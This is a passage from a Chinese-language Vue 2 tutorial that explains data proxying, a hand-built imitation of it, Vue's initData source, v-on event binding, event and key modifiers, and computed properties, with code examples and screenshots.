    el : '#app',
    data : target
})
```

就是 Vue 实例会做一个数据代理，访问 vm.msg 时会间接的去访问目标对象 data 的 msg，这就达到了一个效果：感觉 data 中的属性设置到了 vm 上。

此时在浏览器控制台中输出 proxy，可以看到他有个属性 name，name 后面是 (...)，这种形式就一定是数据代理机制：

![image-20240421094446487](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210944569.png)

当点击 name 后的三点后，他才会去动态的调用 get 方法，get 方法才会执行。

**2、在对象中的函数/方法 :function 是可以省略的。**

这是 ES6 的新特性。在对象中的函数可以直接这样写：

```js
Object.defineProperty(proxy, 'name', {
    // get : function(){
    //     // 间接访问目标对象的属性
    //     return target.name
    // },
    // set : function(val){
    //     target.name = val
    // }

    get(){
        return target.name
    },
    set(val){
        target.name = val
    }
})
```

### 属性名的要求

Vue 实例中的属性很多，有的以 `$` 开始，有的以 `_` 开始。

+ 所有以 `$` 开始的属性，可以看做是公开的属性，这些属性是供程序员使用的。
+ 所有以 `_` 开始的属性，可以看做是私有的属性，这些属性是 Vue 框架底层使用的。一般我们程序员很少使用。

**1、Vue实例不会给以_和$开始的属性名做数据代理。**

如果允许给 `_` 或 `$` 开始的属性名做数据代理的话，vm 这个 Vue 实例上可能会出现 _xxx 或 $xxx 属性，而这个属性名可能会和 Vue 框架自身的属性名冲突。

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg : 'Hello Vue!',
        _name : 'zhangsan',
        $age : 20
    }
})
```

在以上代码中，data 对象中有 3 个属性，其中 `_name` 和 `$age` 是以下划线和美元符号开头，`msg` 是普通写法，那么在控制台中访问一下：

![image-20240421103612908](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211036001.png)

发现通过 vm 只能访问到 msg 属性了，其他两个访问不到。能访问到 msg 说明 Vue 做了数据代理的；访问不到 `_name` 和 `$age` 说明没有给这两个属性做数据代理。

因为如果给以 `_` 或 `$` 开头的属性做了数据代理，那么程序员可能会起一个根 Vue 实例中原有的属性冲突的属性名，这样的话就会影响到原来 Vue 实例中的值。

**2、在Vue当中，给data对象的属性名命名的时候，不能以_或$开始。**

程序不会报错，但是不能使用 Vue 实例访问到该属性，就相当于没有意义。

### 手写数据代理

这是一个普通的 Vue 程序：

```html
<!-- 容器 -->
<div id="app">
	<h1>{{msg}}</h1>
</div>

<!-- Vue代码 -->
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : 'Hello Vue!',
            name : 'jackson',
            age : 30
        }
    })
</script>
```

手写数据代理机制的最终效果就是，能够通过 vm 访问这个 data 中的 msg。

新建一个 js 文件：myvue.js，然后在项目中安装自己的 js：

```html
<script src="../js/myvue.js"></script> 
```

首先，在创建 Vue 实例的时候，需要一个 Vue 类，所以先创建一个 Vue 类和它的构造函数：

```js
class Vue {
    constructor(options) {
        Object.keys(options.data).forEach((propertyName, index) => {
            console.log(propertyName, index);
        })
    }
}
```

+ options：是一个简单的纯粹的JS对象：{}，作为构造函数的参数，
+ options 对象中有一个 data 配置项，也是一个对象，获取 data 对象的所有属性，分别给每个属性做数据代理
+ Object.keys(options.data)：获取 options.data 中所有的属性名

那么创建 Vue 实例时这样创建：

```js
const vm = new Vue({
    data : {
        msg : 'Hello Vue!',
        name : 'jackson',
        age : 30
    }
})
```

+ 上面的 options 就是这一部分：

  ```js
  {
      data : {
          msg : 'Hello Vue!',
          name : 'jackson',
          age : 30
      }
  }
  ```

此时查看页面控制台：

![image-20240421105635275](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211056373.png)

拿到所有的属性名了后，就可以使用 Object.defineProperty() 来做数据代理：

```js
class Vue {
    constructor(options) {
        Object.keys(options.data).forEach((propertyName, index) => {
            Object.defineProperty(this, propertyName, {
                get() {
                    return options.data[propertyName];
                },
                set(val) {
                    options.data[propertyName] = val;
                }
            })
        })
    }
}
```

+ options.data 就是目标对象

此时就可以访问了：

![image-20240421110310510](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211103618.png)

那么当属性名以 `_` 和 `$` 开头时，不做数据代理，此时就需要做一个判断：

```js
class Vue {
    constructor(options) {
        Object.keys(options.data).forEach((propertyName, index) => {
            let c = propertyName.charAt(0);
            if (c != '_' && c != '$') {
                Object.defineProperty(this, propertyName, {
                    get() {
                        return options.data[propertyName];
                    },
                    set(val) {
                        options.data[propertyName] = val;
                    }
                })
            }      
        })
    }
}
```

此时当我们的 data 中有美元符号和下划线开头的属性时，就不会做数据代理：

```js
const vm = new Vue({
    data : {
        msg : 'Hello Vue!',
        _name : 'jackson',
        $age : 30
    }
})
```

![image-20240421110734027](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211107135.png)

### 解读Vue框架源代码

主要研究 Vue 中的数据代理实现部分。

当前有个页面：

```html
<!-- 容器 -->
<div id="app">
    <h1>姓名：{{name}}</h1>
    <h1>年龄：{{age}}岁</h1>
</div>

<!-- vue代码 -->
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            name : 'jackson',
            age : 35
        }
    })
</script>
```

在浏览器的开发者工具中，点击“源代码”，找到 vue.js，或者也可以直接在 vscode 中查看源代码：

![image-20240421111149537](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211111654.png)

从 Vue 的构造函数中入手，直接在源代码中搜索 `Vue(` ，定位到：

![image-20240421111442326](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211114460.png)

在 5774 行打了一个断点，这一行表示正常情况下会执行的代码，然后刷新，程序回到这个断点这里停下来：

![image-20240421111607500](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211116642.png)

此时点击调试工具中的 Step into，就会进入到 `_init` 函数：

![image-20240421111710260](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211117377.png)

+ 这个 options 就是创建 Vue 实例时传过来的对象

然后在 4701 行打个断点，使用调试工具中的 Resume 达到这个断点：

![image-20240421112125928](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211121102.png)

+ 4701 这一行的代码主要作用是合并 options 到 $options 属性中
+ 并且此时可以看到 vm 中的属性还很少，说明在创建 Vue 实例 vm 的过程中，会不断的给 vm 添加属性

接着在 4714 行打上断点，走到这个断点上来：

![image-20240421112327863](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211123007.png)

这个 initState 是初始化阶段，进入这个函数看看：

![image-20240421112450060](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211124202.png)

这里面最重要的是 initData 函数，初始化数据，数据代理就是在这里面进行的，进入这个 initData 函数：

![image-20240421112704499](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211127630.png)

+ 4391 行：

  ```js
  var data = vm.$options.data;
  ```

  这里 $options 包含了我们创建 Vue 实例时传过来的对象，这个 data 就是我们传过来的对象中的 data。

  注意：这是获取 data。程序执行到这里的时候 vm 上还没有 _data 属性。

+ 4392 行：

  ```js
  data = vm._data = isFunction(data) ? getData(data, vm) : data || {};
  ```

  观察这行代码，他是在判断 data 是否是一个函数，

  + 如果 data 是函数，则调用 getData(data, vm) 来获取 data。
  + 如果 data 不是函数，则直接将 data 返回，给 data 变量。并且同时将 data 赋值给 vm._data 属性了。

  + 这说明创建 Vue 实例的时候，data 不仅可以是一个对象，还可以是一个函数。

  程序执行完这个代码之后，vm 对象上多了一个 _data 这样的属性。

  ![image-20240421113109250](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211131385.png)

  **1、程序执行到这里，为什么要给 vm 扩展一个 _data 属性呢？**

  `_data`属性，以"_"开始，足以说明，这个属性是人家 Vue 框架底层需要访问的。

  **2、Vue框架底层它使用vm._data这个属性干啥呢？**

  `vm._data` 就是创建 Vue 实例时传过去的参数对象：

  ![image-20240421114016429](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211140553.png)

  `vm._data` 这个属性直接指向了底层真实的 data 对象。通过 `_data` 访问的 name 和 age 是不会走数据代理机制的。也就是说，通过 `vm._data` 方式获取 name 和 age 的时候，是不会走 getter 和 setter 方法的。

  注意：对于 Vue 实例 vm 来说，不仅有 _data 这个属性，还有一个 $data 这个属性。

  + _data 是框架内部使用的，可以看做私有的。
  + $data 这是 Vue 框架对外公开的一个属性，是给我们程序员使用。
  + 如果我们程序员不想走代理的方式读取 data，想直接读取 data 当中的数据，可以通过 _data 和 $data 属性来访问,建议使用\$data 这个属性。

+ 4399 行：获取 data 所有的属性名

+ 4404 行：遍历每个属性名

+ 4414 行：

  ```js
  else if (!isReserved(key)) {
  ```

  进入这个 isReserved() 函数中：

  ```js
  function isReserved(str) {
      var c = (str + '').charCodeAt(0);
      return c === 0x24 || c === 0x5f;
  }
  ```

  这个函数是用来判断字符串是否以 _ 和 $ 开始的。

  + true 表示以 _ 或 $ 开始的。
  + false 表示不是以 _ 或 $ 开始的。

+ 4415 行：

  ```js
  proxy(vm, "_data", key);
  ```

  + 这个 key 是当前循环的属性名

  通过这行代码直接进入代理机制（数据代理）。

  ```js
  var sharedPropertyDefinition = {
      enumerable: true,
      configurable: true,
      get: noop,
      set: noop
  };
  function proxy(target, sourceKey, key) {
      sharedPropertyDefinition.get = function proxyGetter() {
          return this[sourceKey][key];
      };
      sharedPropertyDefinition.set = function proxySetter(val) {
          this[sourceKey][key] = val;
      };
      Object.defineProperty(target, key, sharedPropertyDefinition);
  }
  ```

  这行代码走过之后，vm 中就有一个数据代理的属性了。

总结：

+ 创建 Vue 实例时，data 对象中的属性会被做数据代理（属性名不以 _ 和 $ 开头）；
+ Vue 实例中有属性 `_data` 和 `$data`，这两个对象完全一样的，都是创建 Vue 实例时传过去的 data 对象；
+ 通过  `_data` 和 `$data` 可以访问到 data 对象中的属性，且不会走数据代理，程序员一般使用 `$data` 对象

### 关于配置项：enumerable、configurable

该配置项在这里出现过：

![image-20240421143440897](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211434036.png)

enumerable：

+ true：表示该属性是可以遍历的。（可枚举的，可迭代的。）
+ false：表示该属性是不可遍历的。

```js
let phone = {
    name: '苹果X'
}

// 给phone对象新增一个color属性
Object.defineProperty(phone, 'color', {
    value: '奶奶灰',
    enumerable: true,
})
```

此时，在控制台中可以遍历 phone 的属性：

![image-20240421143826409](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211438539.png)

当 enumerable 为 false 的时候，就是不可遍历的：

![image-20240421143911207](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211439338.png)

configurable：

+ true：表示该属性是可以被删除的。

  ![image-20240421144049234](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211440365.png)

+ false：表示该属性是不可以被删除的。

  ![image-20240421144120483](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211441615.png)

## data可以是个函数

在创建 Vue 实例时，一般给 data 配置项设置的是一个对象，

```js
const vm = new Vue({
    el: '#app',
    data : {
        msg : 'Hello Vue!'
    }
})
```

但是也可以是函数：

```js
const vm = new Vue({
    el: '#app',
    data : function() {
        
    }
})
```

此时控制台会报错：

![image-20240421143002350](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211430493.png)

说明 data 如果是函数的话，必须使用 return 语句返回 {} 对象。

```js
const vm = new Vue({
    el: '#app',
    // data : function(){
    //     return {
    //         msg : 'Hello Vue!'
    //     }
    // }

    // 在对象当中，函数的 :function 可以省略
    data() {
        return {
            msg: 'Hello Zhangsan!'
        }
    }
})
```

**什么时候使用对象？什么时候使用函数？**等学到组件就知道了。

## Vue的事件绑定

### 如何绑定

使用 javascript 原生代码如何完成事件绑定：

```html
<button onclick="alert('hello')">hello</button>
```

使用 Vue 来完成事件绑定，需要借助一个指令：`v-on`。

+ 复习，指令的语法格式：

  ```html
  <标签 v-指令名:参数名="表达式">{{插值语法}}</标签>
  ```

`v-on` 的语法格式：`v-on:事件名="表达式"`，例如：

+ `v-on:click="表达式"` 表示当发生鼠标单击事件之后，执行表达式。
+ `v-on:keydown="表达式"` 表示当发生键盘按下事件之后，执行表达式。

**1、在Vue当中，所有事件所关联的回调函数，需要在Vue实例的配置项methods中进行定义。**

使用 Vue 的指令绑定事件，不能像原生 js 那样：

```html
<button v-on:click="alert('hello')">hello</button>
```

当点击按钮后，控制台会报错：

![image-20240421153259740](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211535701.png)

所以在 Vue 当中，所有事件所关联的回调函数，需要在 Vue 实例的配置项 methods 中进行定义。

methods 是一个对象：{}，在这个 methods 对象中可以定义多个回调函数：

```js
const vm = new Vue({
    methods: {
        // 回调函数
        // sayHello : function(){
        //     alert('hello')
        // }
        // : function 可以省略
        sayHello() {
            alert('hello2')
        },
    }
})
```

然后这样使用：

```html
<button v-on:click="sayHello()">hello</button>
```

点击时就会触发这个函数。

**2、简写**

```html
<button @click="sayHello()">hello</button>
```

v-on 指令也有简写形式：

+ `v-on:click` 简写为 `@click`
+ `v-on:keydown` 简写为 `@keydown`
+ `v-on:mouseover` 简写为 `@mouseover`

**3、绑定的回调函数，如果函数调用时不需要传递任何参数，小括号()可以省略。**

```html
<button v-on:click="sayHello">hello</button>
```

**4、Vue在调用回调函数的时候，会自动给回调函数传递一个对象，这个对象是：当前发生的事件对象。**

在 sayHello 方法上加一个参数：

```html
<button v-on:click="sayHello">hello</button>

<script>
    const vm = new Vue({
        methods: {
            sayHello(event) {
                console.log(e);
            },
        }
    })
</script>
```

这时点击该按钮后，查看控制台，会输出一个事件：

![image-20240421154826922](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211548083.png)

拿到了该事件对象后，可以进行一些操作：

```js
const vm = new Vue({
    methods: {
        sayHello(event) {
            console.log(e);
            console.log(event.target)  // 事件发生的地方
            console.log(event.target.innerText)  // 事件发生的控件上的文本
        },
    }
})
```

注意：当省略了小括号后，调回调函数的时候，才会传一个对象过去，会把当前的事件以对象的形式传过去 ，也就是说，如果要使用 event 对象的话，调用该函数时就不能加上小括号，否则会拿不到这个 event 事件：

```html
<button v-on:click="sayHello()">hello</button>
```

此时控制台的输出是 undefined。

**5、在绑定回调函数的时候，可以在回调函数的参数上使用 \$event 占位符，Vue框架看到这个 $event 占位符之后，会自动将当前事件以对象的形式传过去。**

```html
<button v-on:click="sayHello($event, 'zsm')">hello</button>
```

这个 $event 就是占位符。Vue 会将事件对象传到 \$event 占位符所在的位置。

```js
const vm = new Vue({
    methods: {
        sayHello(event, name) {
            console.log(event, name);
        },
    }
})
```

![image-20240421155745391](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404211557538.png)

占位符的位置可以在参数列表中随意。

### 事件中回调函数的this

 在这个回调函数中，使用 this 的话，这个 this 代表的是谁。

实现一个功能，显示一个数字和一个按钮，点击按钮一次，数字就加一。

直接绑定事件为表达式：

```html
 <!-- 容器 -->
<div id="app">
    <h1>计数器：{{counter}}</h1>
    <button @click="counter++">点击我加1</button>
</div>
<!-- vue代码 -->
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            counter : 0
        }
    });
</script>
```

绑定事件为函数：

```html
 <!-- 容器 -->
<div id="app">
    <h1>计数器：{{counter}}</h1>
    <button @click="add">点击我加1</button>
    <button @click="add2">点击我加1（箭头函数）</button>
</div>
<!-- vue代码 -->
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            counter : 0
        },
        methods : {
            add(){
                
            },
        }
    });
</script>
```

那么如何在 add 方法中访问 counter 变量呢？先研究一下 Vue 实例 vm 和 add 方法中的 this 的关系：

```js
add(){
	console.log(vm === this);
},
```

结果是 true，说明 add 方法中的 this 就是 Vue 实例。所以想要访问 counter 变量，就可以使用数据代理的方式，使用 this 或 vm 直接访问：

```js
add(){
	this.coutner++;
    // vm.counter++;
},
```

+ 不能直接这样写：

  ```js
  add(){
  	counter++;
  },
  ```

  这会报错，因为 counter 是 data 对象中的，在 add 方法中访问不到。

**如何回调函数是箭头函数呢？**

```js
add : () => {
	this.counter++;
},
```

这样写了后，点击按钮，计数器 counter 并没有变化，这说明箭头函数中的 this 和普通函数中的 this 不一样。

输出一下箭头函数中的 this：

![image-20240422142417903](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404221424081.png)

这是因为：==箭头函数中没有 this，箭头函数中的 this 是从父级作用域中继承过来的==。那么对于当前程序来说，父级作用域就是全局作用域 window。

### methods的实现原理

**1、methods对象中的方法可以通过vm去访问吗？**

可以。

在 methods 中定义一个函数，在浏览器控制台中使用 vm 去访问试一下：

```js
methods : {
    sayHi(){
        alert('hi...')
    }
}
```

![image-20240422142751411](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404221427584.png)

**2、methods对象中的方法有没有做数据代理呢？**

没有。

直接输出 vm 可以看到：

![image-20240422142958682](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404221429863.png)

只有 data 中的数据才做了数据代理，methods 中的方法不会做数据代理。

**为什么methods中的方法可以给vm用？**

打开之前手写的 myvue.js：

```js
class Vue {
    constructor(options) {
        Object.keys(options.data).forEach((propertyName, index) => {
            let c = propertyName.charAt(0);
            if (c != '_' && c != '$') {
                Object.defineProperty(this, propertyName, {
                    get() {
                        return options.data[propertyName];
                    },
                    set(val) {
                        options.data[propertyName] = val;
                    }
                })
            }      
        })
    }
}
```

这只是对数据代理的实现原理的模仿，模仿的是 data。那么还可以模仿下 methods 的原理：

```js
// 获取并遍历所有的方法名
Object.keys(options.methods).forEach((methodName, index) => {
    // 给当前的Vue实例扩展一个方法
    this[methodName] = options.methods[methodName];
});
```



![image-20240422143819724](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404221438901.png)

### 事件修饰符

Vue 当中提供的事件修饰符：

+ `.stop` ： 停止事件冒泡，等同于 `event.stopPropagation()`
+ `.prevent ` ： 等同于 `event.preventDefault()`  阻止事件的默认行为。
+ `.capture` ：添加事件监听器时使用事件捕获模式。
+ `.self` ：这个事件如果是“我自己元素”上发生的事件，这个事件不是别人给我传递过来的事件，则执行对应的程序。
+ `.once` ： 事件只发生一次
+ `.passive` ：`passive` 翻译为顺从/不抵抗。无需等待，直接继续（立即）执行事件的默认行为。
  + `.passive` 和 `.prevent` 修饰符是对立的。不可以共存。（如果一起用，就会报错。）
  + `.prevent`：阻止事件的默认行为。
  + `.passive`：解除阻止。

**1、阻止默认行为**

比如，现在有一个超链接，链接到一个网址，想点击链接后执行一个 js 回调函数。正常情况下，点击后，执行了回调函数后，会执行超链接的默认行为，跳转到目标网站中，而现在要阻止这个默认行为。

```html
<div id="app">
    <h1>{{msg}}</h1>
    <a href="https://www.baidu.com" @click="yi">百度</a>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '事件修饰符'
        },
        methods : {
            yi(){
                alert(1)
            },
        }
    })
</script>
```

以上代码点击链接后，会弹出一个提示框，关闭提示框后，就会跳转到百度的页面，就是会执行超链接的默认行为。那么要阻止这个行为。

使用 js 代码，手动调用事件对象的 preventDefault() 方法，可以阻止事件的默认行为。：

```js
yi(event){
    event.preventDefault();
    alert(1)
},
```

在 Vue 当中，这种事件的默认行为可以不采用手动调用 DOM 的方式来完成，可以使用事件修饰符 `:prevent`:

```html
<a href="https://www.baidu.com" @click.prevent="yi">百度</a>
```

**2、停止事件冒泡**

事件冒泡的意思就是，最内层的事件发生后，会向上传递，一直到根节点的事件发生：

```html
<div @click="san">
    <div @click="er">
        <button @click="yi">冒泡事件</button>
    </div>
</div>
```

点击按钮后，会触发按钮的点击事件，函数 yi() 执行，然后向上冒泡，第二层的 div 的点击函数 er() 也会被执行，再向上冒泡，第一层 div 的点击函数 san()  也会被执行，最后还有往外冒……

使用 `.stop` 修饰符，表示该事件不会向上冒泡：

```html
<div @click="san">
    <div @click="er">
        <button @click.stop="yi">冒泡事件</button>
    </div>
</div>
```

这样，点击按钮后，就只会执行到 yi() 函数，不会执行 er() 函数。

**3、添加事件监听器时使用事件捕获模式**

先给谁添加事件监听器，谁就先执行。

添加事件监听器包括两种不同的方式：

+ 一种是从内到外添加。（事件冒泡模式，默认）
+ 一种是从外到内添加。（事件捕获模式）

```html
<div @click.capture="san">
    <div @click.capture="er">
        <button @click.capture="yi">添加事件监听器的时候采用事件捕获模式</button>
    </div>
</div>
```

此时点击按钮，先执行的是 san() 函数，再执行 er() 函数，最后执行 yi() 函数。

```html
<div @click.capture="san">
    <!-- 这里没有添加.capture修饰符，以下这个元素，以及这个元素的子元素，都会默认采用冒泡模式。 -->
    <div @click="er">
        <button @click="yi">添加事件监听器的时候采用事件捕获模式</button>
    </div>
</div>
```

此时第一层的 div 添加事件监听器是事件捕获模式，第二层 div 和按钮是冒泡模式，所以这时候点击按钮，会先执行 san() 函数，在执行 yi() 函数，最后执行 er() 函数。

**4、.self修饰符**

`.self` ：这个事件如果是“我自己元素”上发生的事件，这个事件不是别人给我传递过来的事件，则执行对应的程序。

```html
<div @click="san">
    <div @click="er">
        <button @click.self="yi">self修饰符</button>
    </div>
</div>
```

此时，点击按钮后，会触发该按钮本身上有的点击事件 yi()，然后想上冒泡，触发 er() 和 san()。

将 `.self` 换个位置：

```html
<div @click="san">
    <div @click.self="er">
        <button @click="yi">self修饰符</button>
    </div>
</div>
```

此时，点击按钮后，按钮的 yi() 会执行，然后冒泡到第二层的 div 上，但是该事件不是第二层 div 的本身的事件，所以不会执行 er() 函数，但是事件会继续向上冒，san() 函数会被执行。

**5、事件只发生一次**

```html
<button @click="yi">事件只发生一次</button>
```

此时这个按钮，点击几次，执行几次。

```html
<button @click.once="yi">事件只发生一次</button>
```

此时这个按钮，第一次点击会执行 yi() 函数，以后点击都不会执行。

**6、.passive修饰符**

无需等待，直接继续（立即）执行事件的默认行为。

准备几个元素：

```html
<style>
    .divList{
        width: 300px;
        height: 200px;
        background-color: aquamarine;
        overflow: auto;
    }
    .item{
        width: 300px;
        height: 200px;
    }
</style>

<div class="divList">
    <div class="item">div1</div>
    <div class="item">div2</div>
    <div class="item">div3</div>
</div>
```

此时的效果是这样的：

![image-20240422152907352](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404221529553.png)

当鼠标在该区域滚动的时候，会触发默认的 wheel 事件，这个 wheel 事件就是滚动条滚动。那么给 最外层的 div 绑定一个 wheel 事件：

```html
<div class="divList" @wheel="testPassive">
    <div class="item">div1</div>
    <div class="item">div2</div>
    <div class="item">div3</div>
</div>

<script>
    const vm = new Vue({
        el : '#app',
        methods : {
            testPassive(){
                console.log('test passive')
            }
        }
    })
</script>
```

此时每滚动一次鼠标的中轮，就会输出一句 test passive。此时将该默认事件阻止：

```js
testPassive(){
    console.log('test passive');
    event.preventDefault()
}
```

现在每滚动一次，滚动条不会再滚动了，但是输出还会输出。

此时使用 `.passive` 修饰符来解除阻止默认行为的操作：

```html
<div class="divList" @wheel.passive="testPassive">
    <div class="item">div1</div>
    <div class="item">div2</div>
    <div class="item">div3</div>
</div>
```

此时默认行为滚动条滚动已经解除了，但是滚动一次就会报错：

![image-20240422153529628](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404221535828.png)

所以 `.passive` 和 `.prevent` 修饰符是对立的。不可以共存。（如果一起用，就会报错。）

那么 `.passive` 用在什么时候？将 testPassive 方法改变一下：

```js
testPassive(event){
    for(let i = 0; i < 100000; i++){
        console.log('test passive')
    }
}
```

然后先不使用修饰符：

```html
<div class="divList" @wheel="testPassive">
    <div class="item">div1</div>
    <div class="item">div2</div>
    <div class="item">div3</div>
</div>
```

此时，滚动一次滑轮，就会执行一次 100000 次的循环，然后才会执行默认行为，滚动条才会滚动。

使用了修饰符后：

```html
<div class="divList" @wheel.passive="testPassive">
    <div class="item">div1</div>
    <div class="item">div2</div>
    <div class="item">div3</div>
</div>
```

滚动滑轮，滚动条正常滚动，而这个 100000 次的循环也在正常运行。

**7、联合使用事件修饰符**

在 Vue 当中，事件修饰符是可以多个联合使用的。

```html
<div @click="san">
    <div @click="er">
        <button @click.self.stop="yi">self修饰符</button>
    </div>
</div>
```

但是需要注意：

+ `@click.self.stop`：先 .self，再 .stop
+ `@click.stop.self`：先 .stop，再 .self

### 按键修饰符

9 个比较常用的按键修饰符：

+ `.enter`
+ `.tab `（必须配合keydown事件使用。）
  + tab 键无法触发 keyup 事件，keyup 会切换光标。
  + 只能触发 keydown 事件。因为按住不松手的话就会一直触发 keydown 事件
+ `.delete` (捕获“删除”和“退格”键)
+ `.esc`
+ `.space`
+ `.up`
+ `.down`
+ `.left`
+ `.right`

这些按键修饰符的使用方法都差不多。

**0、按回车后获取输入的值**

比如，现有一个文本框，绑定一个按键触发事件，当输入回车后，控制台打印出输入的内容：

```html
<input type="text" @keyup="getInfo"><br>

<script>
    const vm = new Vue({
        el: '#app',
        methods: {
            getInfo(event) {
                if(event.keyCode === 13){
                	console.log(event.target.value)
                }
            }
        }
    })
</script>
```

+ 事件对象中有按下的键的值 keyCode
+ 事件对象中的 target 就是事件发生在哪的元素

此时输入内容后按下回车就会在控制台中输出输入的内容。

那么此时不想写 if 语句判断是不是回车键，就可以使用按键修饰符 `.enter`：

```html
<input type="text" @keyup.enter="getInfo"><br>
```

此时，只要发生 keyup 事件，并且是由 enter 键触发的事件，就会执行 getInfo() 函数。

这个修饰符也可以写键值：

```html
<input type="text" @keyup.13="getInfo"><br>
```

**1、怎么获取某个键的按键修饰符？**

第一步：通过 `event.key` 获取这个键的真实名字。

第二步：将这个真实名字以 kebab-case 风格进行命名。

比如 PageDown 是真实名字。经过命名之后：page-down 就是按键的修饰符。
```html
<input type="text" @keyup.page-down="getInfo"><br>
```

**2、按键修饰符是可以自定义的？**

通过 Vue 的全局配置对象 config 来进行按键修饰符的自定义。

语法规则：

```js
Vue.config.keyCodes.按键修饰符的名字 = 键值
```

比如自定义一个回车的按键修饰符：

```js
Vue.config.keyCodes.huiche = 13
```

+ 自定义按键名必须是小写

**3、系统修饰键**

4 个比较特殊的键。

+ ctrl
+ alt
+ shift
+ meta（win键）

对于 keydown 事件来说：只要按下系统修饰键，keydown 事件就会触发。

对于 keyup 事件来说：需要按下系统修饰键，并且加上按下组合键，然后松开组合键之后，keyup 事件才能触发。

**4、限制组合键**

```html
<input type="text" @keyup.ctrl.i="getInfo"><br>
```

这种方式限制了只能按下 ctrl+i 才会触发事件

## 计算属性

### 反转字符串

用户在一个输入框中输入字符串，另一个地方中显示出用户输入的字符串的反转结果。

**1、使用原生js方法实现**

```html
<div id="app">
    <h1>{{msg}}</h1>
    输入的信息：<input type="text" v-model="info"> <br>
    反转的信息：{{info.split('').reverse().join('')}} <br>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '计算属性-反转字符串案例',
            info : ''
        }
    })
</script>
```

使用 v-model 双向绑定数据，再调用 js 中字符串和数组的方法完成反转。这样写可以实现功能，但是有三个问题：

1. 可读性差。
2. 代码没有得到复用。
3.  难以维护。

**2、使用methods实现**

可以将 `info.split('').reverse().join('')` 这一段逻辑操作写到一个方法中：

```html
<div id="app">
    <h1>{{msg}}</h1>
    输入的信息：<input type="text" v-model="info"> <br>
    <!-- 在插值语法中可以调用方法，小括号不能省略。这个方法需要是Vue实例所管理的。 -->
    反转的信息：{{reverseInfo()}} <br>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
            msg : '计算属性-反转字符串案例',
            info : ''
        },
        methods : {
            // 反转信息的方法
            reverseInfo(){
                console.log('@')
                return this.info.split('').reverse().join('');
            }
        }
    })
</script>
```

这样也可以实现功能，但是最大的问题就是效率问题，当 info 的值改变时，reverseInfo 方法会被调用一次，如果页面中有多次使用该方法的话，就会调用多次。

所以 Vue 提供了一个计算属性。

### 使用计算属性

**1、什么是计算属性？**

使用 Vue 的原有属性，经过一系列的运算/计算，最终得到了一个全新的属性，叫做计算属性。

+ Vue 的原有属性: data 对象当中的属性可以叫做 Vue 的原有属性。
+ 全新的属性: 表示生成了一个新的属性，和 data 中的属性无关了，新的属性也有自己的属性名和属性值。

**2、计算属性的作用？**

代码得到了复用。

代码更加便于维护了。

代码的执行效率高了。

**3、计算属性怎么用？**

语法格式：在 Vue 实例中需要一个新的配置项 computed

```js
computed : {
    // 这是一个计算属性
    计算属性1 : {
        // setter 和 getter方法。
        // 当读取计算属性1的值的时候，getter方法被自动调用。
        get(){

        },
        // 当修改计算属性1的值的时候，setter方法被自动调用。
        set(val){

        }
    },
    // 这是另一个计算属性
    计算属性2 : {},
}
```

比如：

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg : '计算属性-反转字符串案例',
        info : ''
    },
    computed : {       
        hehe : {
            get(){
                console.log('getter方法调用了')
                return 'haha';
            },
            set(val){
                console.log('setter方法调用了')
            }
        },
    }
})
```

+ get() 返回的就是该计算属性的值
+ set() 设置的就是该计算属性的值
+ get() 的调用时机包括两个
  + 第一个时机：第一次访问这个属性的时候。
  + 第二个时机：该计算属性所关联的 Vue 原有属性的值发生变化时，getter 方法会被重新调用一次。

可以定义多个计算属性，这里有一个计算属性 hehe，可以在 Vue 开发者工具中看到：

![](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231644064.png)

可以在控制台中使用 `vm.计算属性` 来实现访问计算属性，但是不能使用` vm._data.计算属性`，因为计算属性和 data 对象没有关系了：

![image-20240423164521087](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404231645337.png)

在页面中使用计算属性和使用 data 中的属性是一样的，可以使用插值语法。同时，如果多个地方都使用了计算属性的话，计算属性的 getter 方法只会被执行一次，而不是像使用 methods 那样调用多次。

```html
 <div id="app">
     <h1>{{msg}}</h1>
     输入的信息：<input type="text" v-model="info"> <br>
     反转的信息：{{reversedInfo}}<br>
     <!-- 有缓存机制，computed 中的方法就调用了一次 -->
     {{hehe}} <br>
     {{hehe}} <br>
     {{hehe}} <br>
     {{hehe}} <br>
     {{hehe}} <br>
     <!-- 没有缓存机制，method 中的方法调用了多次 -->
     {{hello()}} <br>
     {{hello()}} <br>
     {{hello()}} <br>
     {{hello()}} <br>
     {{hello()}} <br>
</div>
<script>
    const vm = new Vue({
        el : '#app',
        data : {
